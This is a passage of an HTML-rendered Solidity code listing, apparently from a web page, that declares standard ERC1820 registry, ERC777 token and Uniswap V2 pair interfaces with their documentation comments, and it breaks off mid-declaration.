class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.0. SEE SOURCE BELOW. !!</span><br><span class="line">pragma solidity &gt;=0.7.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">interface IERC1820Registry &#123;</span><br><span class="line">    function setInterfaceImplementer(</span><br><span class="line">        address _addr,</span><br><span class="line">        bytes32 _interfaceHash,</span><br><span class="line">        address _implementer</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function getManager(address _addr) external view returns (address);</span><br><span class="line"></span><br><span class="line">    function setManager(address _addr, address _newManager) external;</span><br><span class="line"></span><br><span class="line">    function interfaceHash(string memory _interfaceName)</span><br><span class="line">        external</span><br><span class="line">        pure</span><br><span class="line">        returns (bytes32);</span><br><span class="line"></span><br><span class="line">    function updateERC165Cache(address _contract, bytes4 _interfaceId) external;</span><br><span class="line"></span><br><span class="line">    function getInterfaceImplementer(address _addr, bytes32 _interfaceHash)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (address);</span><br><span class="line"></span><br><span class="line">    function implementsERC165InterfaceNoCache(</span><br><span class="line">        address _contract,</span><br><span class="line">        bytes4 _interfaceId</span><br><span class="line">    ) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function implementsERC165Interface(address _contract, bytes4 _interfaceId)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (bool);</span><br><span class="line"></span><br><span class="line">    event InterfaceImplementerSet(</span><br><span class="line">        address indexed addr,</span><br><span class="line">        bytes32 indexed interfaceHash,</span><br><span class="line">        address indexed implementer</span><br><span class="line">    );</span><br><span class="line">    event ManagerChanged(address indexed addr, address indexed newManager);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IERC777 &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the name of the token.</span><br><span class="line">     */</span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the symbol of the token, usually a shorter version of the</span><br><span class="line">     * name.</span><br><span class="line">     */</span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the smallest part of the token that is not divisible. This</span><br><span class="line">     * means all token operations (creation, movement and destruction) must have</span><br><span class="line">     * amounts that are a multiple of this number.</span><br><span class="line">     *</span><br><span class="line">     * For most token contracts, this value will equal 1.</span><br><span class="line">     */</span><br><span class="line">    function granularity() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the amount of tokens in existence.</span><br><span class="line">     */</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the amount of tokens owned by an account (`owner`).</span><br><span class="line">     */</span><br><span class="line">    function balanceOf(address owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves `amount` tokens from the caller&#x27;s account to `recipient`.</span><br><span class="line">     *</span><br><span class="line">     * If send or receive hooks are registered for the caller and `recipient`,</span><br><span class="line">     * the corresponding functions will be called with `data` and empty</span><br><span class="line">     * `operatorData`. See &#123;IERC777Sender&#125; and &#123;IERC777Recipient&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Sent&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements</span><br><span class="line">     *</span><br><span class="line">     * - the caller must have at least `amount` tokens.</span><br><span class="line">     * - `recipient` cannot be the zero address.</span><br><span class="line">     * - if `recipient` is a contract, it must implement the &#123;IERC777Recipient&#125;</span><br><span class="line">     * interface.</span><br><span class="line">     */</span><br><span class="line">    function send(</span><br><span class="line">        address recipient,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Destroys `amount` tokens from the caller&#x27;s account, reducing the</span><br><span class="line">     * total supply.</span><br><span class="line">     *</span><br><span class="line">     * If a send hook is registered for the caller, the corresponding function</span><br><span class="line">     * will be called with `data` and empty `operatorData`. See &#123;IERC777Sender&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Burned&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements</span><br><span class="line">     *</span><br><span class="line">     * - the caller must have at least `amount` tokens.</span><br><span class="line">     */</span><br><span class="line">    function burn(uint256 amount, bytes calldata data) external;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns true if an account is an operator of `tokenHolder`.</span><br><span class="line">     * Operators can send and burn tokens on behalf of their owners. All</span><br><span class="line">     * accounts are their own operator.</span><br><span class="line">     *</span><br><span class="line">     * See &#123;operatorSend&#125; and &#123;operatorBurn&#125;.</span><br><span class="line">     */</span><br><span class="line">    function isOperatorFor(address operator, address tokenHolder) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Make an account an operator of the caller.</span><br><span class="line">     *</span><br><span class="line">     * See &#123;isOperatorFor&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;AuthorizedOperator&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements</span><br><span class="line">     *</span><br><span class="line">     * - `operator` cannot be calling address.</span><br><span class="line">     */</span><br><span class="line">    function authorizeOperator(address operator) external;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Revoke an account&#x27;s operator status for the caller.</span><br><span class="line">     *</span><br><span class="line">     * See &#123;isOperatorFor&#125; and &#123;defaultOperators&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;RevokedOperator&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements</span><br><span class="line">     *</span><br><span class="line">     * - `operator` cannot be calling address.</span><br><span class="line">     */</span><br><span class="line">    function revokeOperator(address operator) external;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the list of default operators. These accounts are operators</span><br><span class="line">     * for all token holders, even if &#123;authorizeOperator&#125; was never called on</span><br><span class="line">     * them.</span><br><span class="line">     *</span><br><span class="line">     * This list is immutable, but individual holders may revoke these via</span><br><span class="line">     * &#123;revokeOperator&#125;, in which case &#123;isOperatorFor&#125; will return false.</span><br><span class="line">     */</span><br><span class="line">    function defaultOperators() external view returns (address[] memory);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves `amount` tokens from `sender` to `recipient`. The caller must</span><br><span class="line">     * be an operator of `sender`.</span><br><span class="line">     *</span><br><span class="line">     * If send or receive hooks are registered for `sender` and `recipient`,</span><br><span class="line">     * the corresponding functions will be called with `data` and</span><br><span class="line">     * `operatorData`. See &#123;IERC777Sender&#125; and &#123;IERC777Recipient&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Sent&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements</span><br><span class="line">     *</span><br><span class="line">     * - `sender` cannot be the zero address.</span><br><span class="line">     * - `sender` must have at least `amount` tokens.</span><br><span class="line">     * - the caller must be an operator for `sender`.</span><br><span class="line">     * - `recipient` cannot be the zero address.</span><br><span class="line">     * - if `recipient` is a contract, it must implement the &#123;IERC777Recipient&#125;</span><br><span class="line">     * interface.</span><br><span class="line">     */</span><br><span class="line">    function operatorSend(</span><br><span class="line">        address sender,</span><br><span class="line">        address recipient,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Destroys `amount` tokens from `account`, reducing the total supply.</span><br><span class="line">     * The caller must be an operator of `account`.</span><br><span class="line">     *</span><br><span class="line">     * If a send hook is registered for `account`, the corresponding function</span><br><span class="line">     * will be called with `data` and `operatorData`. See &#123;IERC777Sender&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Burned&#125; event.</span><br><span class="line">     *</span><br><span class="line">     * Requirements</span><br><span class="line">     *</span><br><span class="line">     * - `account` cannot be the zero address.</span><br><span class="line">     * - `account` must have at least `amount` tokens.</span><br><span class="line">     * - the caller must be an operator for `account`.</span><br><span class="line">     */</span><br><span class="line">    function operatorBurn(</span><br><span class="line">        address account,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    event Sent(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed from,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event Minted(address indexed operator, address indexed to, uint256 amount, bytes data, bytes operatorData);</span><br><span class="line"></span><br><span class="line">    event Burned(address indexed operator, address indexed from, uint256 amount, bytes data, bytes operatorData);</span><br><span class="line"></span><br><span class="line">    event AuthorizedOperator(address indexed operator, address indexed tokenHolder);</span><br><span class="line"></span><br><span class="line">    event RevokedOperator(address indexed operator, address indexed tokenHolder);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Uni_Pair_V2 &#123;</span><br><span class="line"></span><br><span class="line">    event Approval( address indexed owner,address indexed spender,uint256 value ) ;</span><br><span class="line">    event Burn( address indexed sender,uint256 amount0,uint256 amount1,address indexed to ) ;</span><br><span class="line">    event Mint( address indexed sender,uint256 amount0,uint256 amount1 ) ;</span><br><span class="line">    event Swap( address indexed sender,uint256 amount0In,uint256 amount1In,uint256 amount0Out,uint256 amount1Out,address indexed to ) ;</span><br><span class="line">    event Sync( uint112 reserve0,uint112 reserve1 ) ;</span><br><span class="line">    event Transfer( address indexed from,address indexed to,uint256 value ) ;</span><br><span class="line">    function DOMAIN_SEPARATOR(  ) external view returns (bytes32 ) ;</span><br><span class="line">    function MINIMUM_LIQUIDITY(  ) external view returns (uint256 ) ;</span><br><span class="line">    function PERMIT_TYPEHASH(  ) external view returns (bytes32 ) ;</span><br><span class="line">    function allowance( address ,address  ) external view returns (uint256 ) ;</span><br><span class="line">    function approve( address spender,uint256 value ) external  returns (bool ) ;</span><br><span class="line">    function balanceOf( address  ) external view returns (uint256 ) ;</span><br><span class="line">    function burn( address to ) external  returns (uint256 amount0, uint256 amount1) ;</span><br><span class="line">    function decimals(  ) external view returns (uint8 ) ;</span><br><span class="line">    function factory(  ) external view returns (address ) ;</span><br><span class="line">    function getReserves(  ) external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) ;</span><br><span class="line">    function initialize( address _token0,address _token1 ) external   ;</span><br><span class="line">    function kLast(  ) external view returns (uint256 ) ;</span><br><span class="line">    function mint( address to ) external  returns (uint256 liquidity) ;</span><br><span class="line">    function name(  ) external view returns (string memory ) 